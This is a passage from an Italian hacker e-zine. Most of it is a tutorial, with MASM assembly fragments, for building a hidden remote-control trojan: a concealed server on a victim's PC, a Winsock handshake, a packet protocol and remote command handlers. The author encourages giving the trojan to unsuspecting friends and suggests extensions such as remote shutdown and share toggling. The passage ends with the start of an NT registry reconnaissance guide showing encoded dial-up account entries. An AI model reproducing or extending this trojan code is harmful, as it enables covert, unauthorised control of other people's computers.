        00020029h, ADDR hNETSERVERkey

Un valore di ritorno in EAX diverso da ERROR_SUCCESS significhera' che la
nostra chiave e' gia presente, e sara' bene terminare il processo corrente.

2) LA BASE DEL PROGRAMMA CLIENT

Qui e' tutto facile, in quanto si tratta di normale programmazione della
GUI di Windows. Il primo passo e' creare e compilare un file di risorse che
definisca l'aspetto della nostra finestra (guardatevi il file
resource\netclnt.rc nell'archivio di distribuzione), e quindi un programma
che mostri tale finestra (ho scelto che venga creata una dialogbox tramite
la DialogBoxParam, per l'incredibile flessibilita') e gestisca le
operazioni dell'utente tramite la GetMessage, la TranslateMessage e la
DispatchMessage. Non voglio dilungarmi oltre proprio perche' e' normale
programmazione base.

3) COMUNICAZIONE FRA I DUE PROGRAMMI TRAMITE WINSOCK

A questo punto abbiamo due bei programmi, un server nascosto nel pc
dell'utente vittima, e un client con tanti bei bottoni dalla nostra parte.
Cosi' come sono non servono a nulla, se non possono comunicare tra loro.
E' il momento di stabilire una connessione TCP/IP, e per far questo
utilizzeremo le funzioni delle Winsock. La modalita' di comunicazione
scelta e' Asynchronous non-blocking, e quindi i nostri pacchetti
viaggeranno via TCP (non UDP come il Back Orifice), e potranno partire e
arrivare in qualunque ordine. Sara' compito dei programmi (vedremo dopo
come) scomporre e ricomporre i dati nella giusta sequenza.
Per prima cosa i nostri programmi dovranno inizializzare le Winsock,
tramite le funzioni WSAStartup, socket e htons. Il codice comune lo trovate
nella procedura OpenSocket presente nel file include/socketop.inc
Vi consiglio caldamente la lettura del tutorial di Iczelion sulla
programmazione dell winsock, che trovate a uno dei due url che ho scritto
all'inizio dell'articolo.
Inizializzate le Winsock e' necessario impostare i parametri base di
comunicazione tramite la WSAAsyncSelect.
Per il server e' necessario aprire il socket in modalita' notifica di
ACCETTAZIONE (FD_ACCEPT), lettura e chiusura (FD_READ e FD_CLOSE), mentre
il client dovra' essere notificato di avvenuta CONNESSIONE (FD_CONNECT) e
di lettura e chiusura.
Le strade di server e client si dividono a questo punto.
Per il primo sara' necessario aprire una porta su cui ascoltare una
richiesta di connessione, tramite il seguente codice:

INVOKE  bind, socketDESCRIPTOR, ADDR sin, 16
INVOKE  listen, socketDESCRIPTOR, 2

Il secondo invece dovra' reagire solo nel momento in cui l'utente
richiedera' una connessione. Presupponendo che l'indirizzo IP o host a cui
ci si deve connettere e' stato ricavato da un testo digitato in una editbox
tramite la GetDlgItemTextA e messo in una variabile remoteHOST, la prima
cosa da fare e' convertire l'indirizzo in un formato comprensibile alle
winsock, e cioe' invertendo l'ordine dei campi dell'indirizzo IP (secondo
le specifiche BSD). Cio' si ottiene chiamando la funzione inet_addr.
Il problema sorge nel caso che l'utente abbia inserito non un IP numerico,
ma un hostname: la funzione inet_addr ritornera' il valore INADDR_NONE, e
sara' necessario risolvere l'hostname, con una chiamata alla funzione
gethostbyname. Ecco il codice preso dal client:

INVOKE  inet_addr, ADDR remoteHOST

        .IF eax==INADDR_NONE
            INVOKE  SetWindowText, bhConn, ADDR bResolving
            INVOKE  gethostbyname, ADDR remoteHOST
            .IF eax==NULL
                INVOKE  ShutdownSocket, socketDESCRIPTOR
                ret
            .ENDIF

questa parte si occupera' di risolvere l'hostname, e di chiudere il
tentativo di connessione (resettando il socket) in caso di fallimento.

            mov     eax, [eax+12]
            mov     eax, [eax]
            mov     eax, [eax]
            mov     sin.sin_addr, eax
        .ENDIF


Queste righe invece sono necessarie a riempire il campo sin_addr con
l'indirizzo di rete richiesto. I vari passaggi sono necessari in quanto la
funzione gethostbyname ritorna un puntatore ad una struttura come questa:

struct hostent {
    char FAR *       h_name;
    char FAR * FAR * h_aliases;
    short            h_addrtype;
    short            h_length;
    char FAR * FAR * h_addr_list;
};

e il valore che ci interessa e' contenuto (o puntato) da h_addr_list.
Per quanto riguarda il client, a questo punto la connessione puo' venire
effettuata tramite la funzione connect.
Il server ricevera' un messaggio di tipo FD_ACCEPT, e dovra' accettare la
connessione chiamando la funzione accept.

4) IMPLEMENTAZIONE DELL'HANDSHAKE

Ora i programmi sono connessi e pronti a scambiarsi dati fra loro. Il
problema e' che QUALUNQUE connessione effettuata all'ip del server sulla
porta giusta verra' accettata, e noi non vogliamo che questo succeda.
Server e client devono essere gli unici a comunicare fra loro.
Passo numero uno, impostiamo delle stringhe che indichino in maniera
univoca server e client:

clientID         db          "NSClient-sPISPJ99"
serverID         db          "NSServer-sPISPJ99"

Queste stringhe serviranno ai due programmi per identificarsi al momento
della connessione. Il primo a farsi riconoscere sara' il client che,
ricevuta la conferma dell'avvenuta connessione (sotto forma di un messaggio
di tipo FD_CONNECT), provvedera' a porsi in modalita' handshake (ho
utilizzato una variabile booleana chiamata isHANDSHAKE per questo scopo) e
a trasmettere la propria stringa di identificazione tramite la winsock
send. Il server ricevera' un messaggio di tipo FD_READ, leggera' i dati con
chiamate alla ioctlsocket e alla recv, ed eseguira' un confronto sull'ID
ricevuto.
Nel caso fallisse il confronto la connessione verra' chiusa, il socket
resettato, e il client remoto verra' forzato a chiudere la comunicazione
con l'invio di un messaggio FD_CLOSE. Nel caso invece che la stringa di
identificazione venga riconosciuta, spettera' al server inviare la propria
e al client riconoscerla, con le stesse modalita' appena descritte. Il
codice e' praticamente uguale per entrambi i programmi, tranne le sezioni
riguardanti la chiusura della connessione, che ometto:

INVOKE  ioctlsocket, remoteDESCRIPTOR, FIONREAD, ADDR availableData
.IF eax==NULL

    INVOKE  recv, remoteDESCRIPTOR, offsetBuffer, availableData, 0
    INVOKE  StrCmp, ADDR clientID, offsetBuffer, cIDLEN
    .IF eax==TRUE
        mov     isReliable, TRUE    ;la connessione e' riconosciuta
        mov     isHandshake, FALSE

        INVOKE  send, remoteDESCRIPTOR, ADDR serverID, sIDLEN, 0
        .IF eax==0 || eax==SOCKET_ERROR
            mov     eax, FALSE
        .ELSE
             mov     eax, TRUE
        .ENDIF

        .IF eax==FALSE
                   ;chiusura socket
            .IF eax==0
                mov     fConn, FALSE
            .ELSE
                   ;apertura socket
            .ENDIF
        .ENDIF

     .ELSE
                ;chiusura socket
          .IF eax==0
              mov     fConn, FALSE
          .ELSE
                ;apertura socket
          .ENDIF

      mov     isHandshake, FALSE
      mov     receiveLOCK, FALSE
     .ENDIF
.ENDIF

5) SCAMBIO DI DATI

La creazione raw dei pacchetti tcp non e' un nostro problema, dato che
saranno le winsock ad occuparsi di tutto. Il fatto e' che, se si pensa al
tipo di programma che stiamo realizzando, e' necessario inventarsi
qualcosa. Infatti sara' necessario tenere conto che i trasferimenti
potranno andare dal semplice messaggio in una messagebox, e quindi pochi
bytes, a files di qualunque dimensione, e bisognera' pure segnalare
all'interno dei pacchetti il tipo di funzione richiesta. La possibilita' di
trasmettere in una volta sola tutti i dati richiesti ci sarebbe, ma
diventerebbe ESTREMAMENTE pesante per l'utente vittima: immaginatevi di
chiedere il download di un file grande sul mezzo mega... il server riceve
la richiesta, bufferizza in memoria il file e lo trasmette in un blocco
unico. Per questioni di priorita' di thread la connessione della vittima
sembrera' piantarsi fino a trasferimento finito, e con la velocita' della
rete al giorno d'oggi potrebbe trattarsi di un tempo lungo.
Da qui la necessita' di spezzettare i dati, con tutte le conseguenze del
caso.
Per fare cio' ho scelto di costruirmi un formato proprietario dei
pacchetti, definito come segue:

NRPacket         STRUCT
  nrHeader       db         "NRP-"
  nrFCode        dd         ?
  nrPacketSeqNR  dd         ?
  nrPacketInSeq  dd         ?
  nrLenData      dd         ?
;  nrDataCRC32    dd         ?   ; CRC32 IS NOT IMPLEMENTED AT THIS POINT
  nrPointData    dd         ?
  nrTail         dd         ?
NRPacket         ENDS

packet           NRPacket    <> ; basic NetRaider packet definition

La funzione SendCommand (contenuta in include\sendrecv.inc) e' comune al
server e al client, e viene definita nel seguente modo:

SendCommand      PROTO :DWORD,:DWORD,:DWORD

I parametri che vengono passati dal chiamante sono:

- una doubleword che contiene il codice della funzione da eseguire (in
  questa versione abbiamo ad esempio 00000000h per la rimozione del server,
  00000001h per la messagebox e 00000002h per il DDE Execute)
- un puntatore ai dati da inviare. Il chiamante dovra' occuparsi di
  preparare i dati in un buffer.
- l'handle del socket allocato dall'inizializzazione delle winsock,
  attraverso il quale vengono inviati i dati. E' da notare che nel caso del
  client l'handle e' unico e viene restituito dalla funzione socket, mentre
  nel caso del server l'handle e' restituito al momento della richiesta di
  connessione dalla funzione listen, ed e' DIVERSO dall'handle di
  inizializzazione.

La funzione SendCommand si preoccupera' di spezzettare i dati in pacchetti
di dimensione massima 1024bytes e di riempire tutti i campi, in un ciclo
.WHILE .ENDW.
Analizzando la struttura del pacchetto (da conoscere se qualcuno avesse
voglia di fare un client per sistemi *nix), possiamo dire che:

- nrHeader e' fisso, e contiene la dicitura "NRP-", che indica
  inequivocabilmente un pacchetto NetRaider valido.
- nrFCode contiene il codice della funzione richiesta.
- nrPacketSeqNR e' il numero del pacchetto all'interno della sequenza, da 0
  a n-1.
- nrPacketInSeq e' il numero n di pacchetti totali che verranno inviati.
- nrLenData e' una doubleword che indica la lunghezza in bytes dei dati
  presenti nel pacchetto, con un minimo di NULL se non ci sono dati ad un
  massimo di 1024.
- nrDataCRC32 conterrebbe il CRC32 dei dati, ma non e' ancora implementata.
- nrPointData e' una doubleword che punta ai dati da inserire nel
  pacchetto.
- nrTail e' una stringa di 4 bytes, che puo' contenere "-SEQ" se il
  pacchetto e' seguito da altri, o "-ENP" se si tratta dell'ultimo
  pacchetto. Al momento non e' utilizzata.

Non ditemi che ho fatto un gran casino perche' gia' lo so, dovrei rivedere
il tutto e ora non ho voglia. In ogni caso, dopo che la funzione
SendCommand, all'interno del ciclo, ha provveduto a riempire un pacchetto
(definito come packet NRPacket <>, se conoscete le struct), se lo rilegge e
riempie un buffer di invio di dimensione 1048 bytes (1024 per i dati e 24
per i controlli) e con la funzione send delle winsock manda quello.
Per la precisione inserisce nel buffer, prendendo i dati dal packet
riempito prima, l'header, il numero della funzione richiesta, il numero del
pacchetto all'interno della sequenza, i pacchetti totali, la lunghezza del
dato e il dato vero e proprio, leggendolo da packet.nrPointData. Quindi
chiude con la tail. E invia, in modo ORDINATO, cioe' pacchetto 0, pacchetto
1, pacchetto 2, eccetera eccetera.

La ricezione e' un altro paio di maniche, perche' avviene in modo
asincrono, e i pacchetti possono arrivare in qualunque ordine, di solito
sparso, con buona pace del nostro mal di testa.
Quando le winsock rilevano dati disponibili in lettura nel socket allocato,
inviano un messaggio di tipo FD_READ, e viene chiamata la funzione
ProcessIncoming.
Questa funzione si occupa di leggere i dati dal socket e di interpretarli,
e scarta QUALUNQUE pacchetto che non inizi con la sequenza "NRP-" per
evidenti motivi.
Con un esempio e' piu' semplice capire:

1 server o client ricevono un primo pacchetto, verificano l'header (che
  corrisponde a "NRP-" e accettano il pacchetto.
2 si salvano il codice della funzione richiesta e impostano a TRUE la
  variabile receiveLOCK. Questo significa che finche' non verranno ricevuti
  tutti i pacchetti del dato NON SARA' POSSIBILE ESEGUIRE UN'ALTRA
  RICHIESTA. Scordatevi di richiedere piu' funzioni contemporaneamente.
3 viene allocato un buffer di dimensioni sufficienti a contenere tutti i
  dati che arriveranno in seguito (con la semplice formula pacchetti totali
  * 1024).
4 Il buffer viene riempito coi dati del pacchetto ricevuto.

A questo punto la funzione ProcessIncoming termina e l'esecuzione del
programma continua. Qualunque pacchetto venga ricevuto in seguito viene
controllato per l'header, e ANCHE PER IL CODICE DELLA FUNZIONE salvato in
precedenza. Se corrisponde, i dati vengono inseriti nella giusta posizione
nel buffer. Qualunque altro pacchetto che non soddisfa header o codice
verra' scartato.
Un controllo verifica se sono arrivati tutti i pacchetti. In questo caso la
variabile receiveLOCK viene impostata a FALSE, e a seconda del codice di
funzione vengono richiamate le diverse routines, con un parametro che punta
al buffer contenente i dati arrivati:

; // questo e' preso dal server //

.IF eax==totalPackets

   .IF reqOperation==00000000h
       INVOKE  nsRemoveServer

   .ELSEIF reqOperation==00000001h
           INVOKE  nsMessageBox, offsetBuffer

   .ELSEIF reqOperation==00000002h
           INVOKE  nsDDEExecute, offsetBuffer

   .ENDIF

   INVOKE  GlobalUnlock, offsetBuffer
   INVOKE  GlobalFree, hMemory

   mov    receiveLOCK, FALSE

.ENDIF

Quindi viene deallocato il buffer, e server o client sono pronti a gestire
un altro comando. Bel casino, eh?
Spesso le funzioni richiamate si occupano, oltre che di eseguire i comandi
richiesti, anche di costruire una risposta, che viene inviata con la
SendCommand e ricevuta con la ProcessIncoming. E' da tenere a mente che:

- la ProcessIncoming del server riceve RICHIESTE di funzione
- la ProcessIncoming del client riceve RISPOSTE dal server

Le funzioni chiamate si trovano in include\servop.in e include\clntop.inc


6) IMPLEMENTIAMO LE FUNZIONI

Qui si basa tutto sulla fantasia, e sulla conoscenza del funzionamento di
Windows. Faccio solo l'esempio di come funziona un invio di messagebox, che
e' piu' che esplicativo.
Nel client quando viene premuto il bottone Message Box, viene prelevato il
testo nell'editbox a fianco, e viene riempito un buffer. La SendCommand
viene invocata nel modo seguente:

INVOKE  SendCommand, 00000001h, offsetData, socketDESCRIPTOR

dove 00000001h e' il codice della funzione e offsetData il puntatore al
buffer contenente il testo.
Il server riceve la richiesta, ricostruisce i pacchetti e arriva a questo:

.ELSEIF reqOperation==00000001h
        INVOKE  nsMessageBox, offsetBuffer

e richiama la nsMessageBox, con parametro offsetBuffer=puntatore al buffer
in memoria che contiene il testo ricevuto:

nsMessageBox      PROC    messageTEXT:DWORD

                  INVOKE  GlobalAlloc, GHND, 4
                  mov     hDataMem, eax
                  INVOKE  GlobalLock, eax
                  mov     offsetData, eax

                  INVOKE  BringWindowToTop, hDlg
                  INVOKE  SetForegroundWindow, hDlg
                  INVOKE  MessageBoxA, NULL, messageTEXT, \
                          ADDR MsgboxCaption, MB_OK

La nostra message box e' stata mostrata, viene creata la risposta per
l'utente:

                  ;compose buffer with reply from messagebox

                  mov     edi, offsetData
                  stosd

La funzione MessageBoxA ritorna in eax il bottone che e' stato premuto
dall'utente remoto, e viene inserito nel buffer di risposta. Quindi viene
chiamata una SendCommand.

                  INVOKE  SendCommand, 00000001h, offsetData, remoteDESCRIPTOR

                  INVOKE  GlobalUnlock, offsetData
                  INVOKE  GlobalFree, hDataMem            

                  ret
nsMessageBox      ENDP

Il client ricevera' la risposta e mostrera' una messagebox dicendo cosa
l'utente remoto ha risposto.
Direi che tutto sommato e' semplice.

Un'ultima nota. Il codice sorgente e' piu' esplicativo di qualunque
articolo, tenetelo bene a mente :)

      - IL CLIMAX (localita' turistica per chi sa' come spassarsela) -

A questo punto il vostro bel trojan base e' pronto. Lo passate a qualche
amichetto poco furbo e vi rotolate per terra dal ridere ogni volta che vi
chiede come mai il suo pc tutto ad un tratto ha deciso di animarsi di vita
propria, e dire che ha controllato bene, di Netbus o Back Orifice nemmeno
l'ombra...

                      - LA SIGARETTA DI RIFLESSIONE -

Tanto per parlare nel solito e doveroso "legalese", questo programma e'
fornito cosi' com'e' (AS IS per i piu' anglofoni). Morale: se vi salta in
aria il computer, se la vostra ragazza vi lascia, se vi arrestano eccetera
eccetera io NON POSSO ESSERE RITENUTO RESPONSABILE, e tanto meno
s0ftpr0ject. L'avete letto il disclaimer di BFi, vero?
Riassumendo, io non c'ero... se c'ero, dormivo, ero in bagno o trombavo
mentre stavate scasinando (ue' Technolord, ti ricorda forse l'estate del
1995? ...uahuauahaa...).
Siete comunque liberi di modificare e migliorare il sorgente a vostro
piacimento, purche' scriviate da qualche parte che dietro alla base ci sono
io. Se vi limitate a prendere qualche idea basta un ringraziamento, se
invece cambiate soltanto l'about box e cose simili siete dei gran
lamerazzi, e fate pure brutta figura visto che per ora c'e' veramente
poco. Del resto ho fatto questo programmino per curiosita', mica per
distribuirlo (almeno non a questo stadio).

...se l'avessi scritto in elfico non avreste capito un granche', credo...

                       - MIGLIORARE LE PRESTAZIONI -

Per questa volta avete finito, e siete (parzialmente) soddisfatti. Pero' a
pensarci bene poteva essere tutto piu' bello, si potevano fare tanti altri
bei giochetti. Evidentemente bisogna migliorare.
I suggerimenti si potrebbero sprecare. Provate voi a trovare il modo di
implementare funzioni utili, magari gia' viste in programmi simili magari
no.
Qualche dritta ve la posso dare, molto generale si intende. Ad esempio
potrei suggerirvi di ricavare la lista dei processi attivi sulla macchina
remota usando due funzioni non documentate di mamma (puttana) Microsoft,
che guarda caso si chiamano Process32first e Process32next, di attivare e
disattivare le condivisioni degli hard disk on the fly con NetShareAdd e
NetShareDel, di chiudere Windows in remoto con ExitWindowsEx, e tante tante
altre. Dipende dalla vostra fantasia (e dalla voglia di applicarsi).
Quindi mano alle funzioni della ToolHelp32, dell'MCI, installatevi l'help
in linea del Visual C++ 6.0, accendetevi una sigaretta e cominciate a
leggere con gran calma.
Chenneso', magari il tutto potrebbe essere oggetto di un articolo su uno
dei prossimi numeri di BFi...

                            - I RINGRAZIAMENTI -

Di rito (e di dovere) i miei piu' sentiti ringraziamenti ai seguenti guru:

- Black Berry (per la disponibilita', le buone idee, la birra)
- Valvoline   (per il Valv.N.E.T. e per un sicuro prossimo aiuto)
- SMaster     (per l'infinito impegno e pazienza)
- |scacco|    (per la collaborazione)
- xOANON      (perche', che programmi o sprotegga, e' sempre uno dei meglio)
- PhoenYx     (il braccio pesantemente armato dei fuorilegge)
- pIGpEN      (per essere il solito matto che non puo' mancare)
- Cavallo     (per l'interessamento e i suggerimenti)

Ci si rivede su BFi 6 con S.I.R.I.A.
(Security Inspector for Remote Intrusion Attempts)

...forse...

P.S. Se per quanto vi sforziate la suddivisione di questo articolo non vi
     ricorda proprio nulla si suggerisce un soggiorno di almeno una
     settimana nei bordelli di Amsterdam, lontani dal PC (ringrazio il buon
     Giova per la dritta).
     E non prendetelo come qualcosa di personale... :)

\sPIRIT\


--------------------------------[ HACKiNG NT ]--------------------------------
---------------------------------[ PARTE II ]---------------------------------
------------------------------[ Dark Schneider ]------------------------------

Consumo: Solita bottiglia da 1/2 litro (ex gatorade) di coca allungata con
         fanta
	 Pizzette a volonta'
	 Skifezze varie (gigioli, rotelle di liquirizia e affini)
Musica ascoltata: Rage - In Vain (I won't go down)
		  Iced Earth - Melancholy (Holy Martyr)
		  Edguy - Out of Control
		  Rhapsody - The Dark Tower of Abyss
		  Led Zeppelin - The Battle of Evermore
		  MegadetH - Blood of Heroes
		  King Crimson - Cremation
		  Jimi Hendrix - Fire
		  Rainbow - 16th Century Greenslaves
                  Deep Purple - Sail Away
Greets: FuSyS, Benares, Neonsurge e tutto il Rhino9, Cavallo e tutti i fratelli
	di s0ftpr0ject
				  
Ok. Ci siamo.
Il tempo delle mele e' finito. Niente piu' spazio per i newbie. Adesso il
gioco si fa duro e, come si suol dire, i duri cominciano a giocare...
Un anno e' passato, siete cresciuti e adesso dovete prendervi le vostre
responsabilita', cominciando a evolvere la specie, facendo uscire dal
bozzolo l'hacker che e' in voi... Non si puo' passare la vita a vivere alle
spalle di Rootshell, Antionline, Technotronic, Rhino9, l0pht, etc.
Adesso dovete diventare hacker.
Proprio per questo sto cercando di scrivere qualcosa che possa farvi capire
come fare il salto di qualita', almeno nello specifico di Winpull NT.
Ricordero' le regole fondamentali di ogni hacker, buono o cattivo che sia:
1) Leggere. Leggere. Leggere.
2) Riflettere e capire (RTFM docet).
3) Pensare prima di agire.
4) Ricordarsi di The Menthor. Ricordarsi chi siamo.
5) Torna alla regola numero 1 .
E adesso via alle danze...

IL REGISTRY
-----------
Eccoci al cuore de sistema operativo... Qui il kernel e' una stronzatina di
circa 60k che non fa un cazzo per quel che serve a noi, la HAL supplisce
alle mancanze del kernel, ma non e' ancora cosi' importante... Ci sono solo
due cose che contano veramente: il REGISTRY e i SERVICES.
Il registry non e' altro che un database, contenente tutte le informazioni
che servono al sistema per poter funzionare. Se conoscete *nix potete
paragonarlo a /etc e /proc messi insieme.
Proviamo ad aprire il Regedit e osserviamone la struttura. Ci sono sei folder
principali:
HKEY_CLASSES_ROOT
HKEY_CURRENT_USER
HKEY_LOCAL_MACHINE
HKEY_USERS
HKEY_CURRENT_CONFIG
HKEY_DYN_DATA
Diciamo che quelli che interessano a noi sono HKEY_LOCAL_MACHINE e HKEY_USERS.
Per gli altri leggetevi la documentazione on-line (che dovreste leggere
comunque... scaricatevela da www.microsoft.com se non avete il S.O. originale.
Lo so che non e' tanto bello, ma qualche sacrificio lo dovrete pur fare ogni
tanto, no?). Vediamoli uno per volta:

HKEY_USERS
Qui ci sono solo alcune chiavi interessanti... Le altre contengono le solite
info di configurazione (tastiera, scheda video, etc.) che a noi interessano
ben poco.

_Network_
Ecco un esempio di export del ramo (gli IP sono stati occultati per mantenere
l'anonimato sulle stronzate che combino):

REGEDIT4
[HKEY_USERS\.Default\Network]
[HKEY_USERS\.Default\Network\Persistent]
[HKEY_USERS\.Default\Network\Recent]
[HKEY_USERS\.Default\Network\Recent\././159..149..XX..XXX./DISCOC]
"ConnectionType"=dword:00000001
"UserName"="DASHIE"
"ProviderName"="Microsoft Network"
[HKEY_USERS\.Default\Network\Recent\././159..149..XX..XXX./DISCOD]
"ConnectionType"=dword:00000001
"UserName"="DASHIE"
"ProviderName"="Microsoft Network"
[HKEY_USERS\.Default\Network\Recent\././159..149..XX..XXX./discoc]
"ConnectionType"=dword:00000001
"UserName"="DASHIE"
"ProviderName"="Microsoft Network"
[HKEY_USERS\.Default\Network\Recent\././159..149..XX..XXX./discod]
"ConnectionType"=dword:00000001
"UserName"="DASHIE"
"ProviderName"="Microsoft Network"

Questi sono le recenti connessioni in file sharing e le rispettive entry,
ovviamente di tutti gli utenti (per vedere quelle dell'utente corrente
basta guardare HKEY_CURRENT_USER)
E questi qui sono gli export del Remote Access (questo par + utile):

REGEDIT4
[HKEY_USERS\.Default\RemoteAccess]
"AreaCode"=";0372;"
"wizard"=hex:80,00,00,00
"Default"="TIN"
"EnableRedial"=hex:00,00,00,00
"RedialTry"=hex:01,00,00,00
"RedialWait"=hex:00,00,00,00
"EnableImplicit"=hex:01,00,00,00
"DialUI"=hex:02,00,00,00
[HKEY_USERS\.Default\RemoteAccess\Addresses]
"TIN"=hex:aa,a9,db,d9,eb,eb,eb,eb,cb,eb,eb,eb,ca,eb,eb,eb,eb,eb,eb,eb,db,eb,eb,\
  eb,c7,eb,eb,eb,d7,eb,eb,eb,eb,db,d8,dc,d9,df,df,d3,de,de,da,eb,bb,bb,bb,eb,\
  e7,eb,eb,eb,fe,eb,eb,eb,ef,eb,eb,eb,77,eb,eb,eb,e3,ea,eb,eb,be,c5,b8,c5,cb,\
  b9,84,89,84,9f,82,88,98,cb,de,dd,a0,cb,bd,84,82,88,8e,cb,ae,b3,bf,eb,eb,eb,\
  eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,\
  eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,\
  eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,\
  eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,86,\
  84,8f,8e,86,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,87,eb,eb,eb,e8,eb,ea,\
  eb,e3,eb,e3,eb,8b,eb,eb,eb,ea,eb,eb,eb,f7,eb,eb,eb,eb,29,ea,eb,fe,cb,eb,eb,\
  eb,eb,e1,eb,e1,eb,e3,eb,eb,fa,f8,eb,eb,eb,3f,6b,ed,eb,eb,eb,db,eb,eb,eb,db,\
  eb,eb,eb,db,eb,eb,eb,db,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,d7,eb,eb,eb,eb,eb,\
  eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,b8,ea,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,eb,\
  eb
"IOL"=hex:a5,a6,d4,d6,e4,e4,e4,e4,c4,e4,e4,e4,c5,e4,e4,e4,e4,e4,e4,e4,d4,e4,e4,\
  e4,c8,e4,e4,e4,d8,e4,e4,e4,e4,d4,d7,d3,d6,d0,d6,d5,d1,d4,d5,e4,b4,b4,b4,e4,\
  e8,e4,e4,e4,f1,e4,e4,e4,e0,e4,e4,e4,78,e4,e4,e4,ec,e5,e4,e4,b1,ca,b7,ca,c4,\
  b6,8b,86,8b,90,8d,87,97,c4,d1,d2,af,c4,b2,8b,8d,87,81,c4,a1,bc,b0,e4,e4,e4,\
  e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,\
  e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,\
  e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,\
  e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,89,\
  8b,80,81,89,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,88,e4,e4,e4,e7,e4,e5,\
  e4,ec,e4,ec,e4,84,e4,e4,e4,e5,e4,e4,e4,f8,e4,e4,e4,e4,26,e5,e4,f1,c4,e4,e4,\
  e4,e4,ee,e4,ee,e4,ec,e4,e4,f5,f7,e4,e4,e4,30,64,e2,e4,e4,e4,d4,e4,e4,e4,d4,\
  e4,e4,e4,d4,e4,e4,e4,d4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,d8,e4,e4,e4,e4,e4,\
  e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,b7,e5,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,e4,\
  e4
"Digicolor"=hex:dd,de,ac,ae,9c,9c,9c,9c,bc,9c,9c,9c,bd,9c,9c,9c,9c,9c,9c,9c,ac,\
  9c,9c,9c,b0,9c,9c,9c,a0,9c,9c,9c,9c,ac,af,ab,ae,a8,ad,a8,aa,aa,af,9c,cc,cc,\
  cc,9c,90,9c,9c,9c,89,9c,9c,9c,98,9c,9c,9c,00,9c,9c,9c,94,9d,9c,9c,c9,b2,cf,\
  b2,bc,ce,f3,fe,f3,e8,f5,ff,ef,bc,a9,aa,d7,bc,ca,f3,f5,ff,f9,bc,d9,c4,c8,9c,\
  9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,\
  9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,\
  9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,\
  9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,\
  9c,f1,f3,f8,f9,f1,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,f0,9c,9c,9c,9f,\
  9c,9d,9c,9c,9c,94,9c,fc,9c,9c,9c,9d,9c,9c,9c,80,9c,9c,9c,9c,5e,9d,9c,89,bc,\
  9c,9c,9c,9c,96,9c,96,9c,94,9c,9c,8d,8f,9c,9c,e2,48,1c,9a,9c,9c,9c,ac,9c,9c,\
  9c,ac,9c,9c,9c,ac,9c,9c,9c,ac,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,a0,9c,9c,9c,\
  9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,9c,cf,9d,9c,9c,9f,9c,9c,9c,dc,1f,9c,9c,9c,\
  9c,9c,9c
[HKEY_USERS\.Default\RemoteAccess\Profile]
[HKEY_USERS\.Default\RemoteAccess\Profile\TIN]
"IP"=hex:1c,00,00,00,02,00,00,00,00,00,00,00,1f,be,1f,c3,00,00,00,00,00,00,00,\
  00,00,00,00,00
"Terminal"=hex:00,00,00,00,00,00,00,00,07,00,00,00,00,00,00,00,00,00,00,00,00,\
  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"Mode"=hex:00,00,00,00
"MultiLink"=hex:00,00,00,00
"User"="username"
[HKEY_USERS\.Default\RemoteAccess\Profile\IOL]
"IP"=hex:1c,00,00,00,02,00,00,00,00,00,00,00,01,18,14,c2,02,18,14,c2,00,00,00,\
  00,00,00,00,00
"Terminal"=hex:00,00,00,00,00,00,00,00,07,00,00,00,00,00,00,00,00,00,00,00,00,\
  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"Mode"=hex:00,00,00,00
"MultiLink"=hex:00,00,00,00
"User"="username"
[HKEY_USERS\.Default\RemoteAccess\Profile\Digicolor]
"IP"=hex:1c,00,00,00,02,00,00,00,00,00,00,00,1f,be,1f,c3,00,00,00,00,00,00,00,\
  00,00,00,00,00
"Terminal"=hex:00,00,00,00,00,00,00,00,07,00,00,00,00,00,00,00,00,00,00,00,00,\
  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"Mode"=hex:00,00,00,00
"MultiLink"=hex:00,00,00,00

Direte: a che cazzo serve tutto questo?
Beh, semplice: INFORMAZIONI.
Certo, e' abbastanza inutile la cosa finche' non abbiamo la possibilita' di
entrare in un sistema e guardarceli... Ma non starei certo qui a scrivere
stronzate se non ci fosse un minimo senso in tutto cio'.
